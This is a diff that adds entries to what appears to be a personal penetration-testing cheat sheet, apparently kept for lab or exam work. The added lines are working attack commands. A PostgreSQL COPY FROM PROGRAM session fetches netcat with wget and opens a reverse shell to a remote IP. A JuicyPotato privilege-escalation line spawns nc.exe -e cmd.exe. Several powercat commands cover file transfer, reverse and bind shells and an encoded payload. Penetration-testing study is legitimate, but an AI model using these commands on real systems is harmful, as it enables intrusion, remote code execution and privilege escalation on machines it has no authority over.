@@ -39,6 +39,21 @@ smbclient //MOUNT/Yourmomma -I 192.168.154.55 -N
 
 # SQL General 
 ```bash
+POSTGRES
+postgres=# \c postgres;
+psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database "postgres" as user "postgres".
+postgres=# DROP TABLE IF EXISTS cmd_exec;
+NOTICE:  table "cmd_exec" does not exist, skipping
+DROP TABLE
+postgres=# CREATE TABLE cmd_exec(cmd_output text);
+CREATE TABLE
+postgres=# COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';
+COPY 0
+postgres=# DELETE FROM cmd_exec;
+DELETE 0
+postgres=# COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';
 
 ```
 
@@ -332,6 +347,18 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.41.12 LPORT=4444 EXITFUNC=threa
 
 # WINDOWS PRIVESC 
 ```bash
+windows 7
+. .\Juicy.Potato.x86.exe -l 7777 -p c:\windows\system32\cmd.exe -a "/c C:\Users\jill\desktop\nc.exe -e cmd.exe 192.168.119.136 5555" -t * -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"
+
+sudo nc -lnvp 443 > receiving_powercat.ps1
+powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+Reverse shell
+powercat -c 10.11.0.4 -p 443 -e cmd.exe
+Bind shell
+powercat -l -p 443 -e cmd.exe
+Base 64 the payload to get across a net
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+powershell.exe -E  (To run and decode the payload)
 
 ```
 
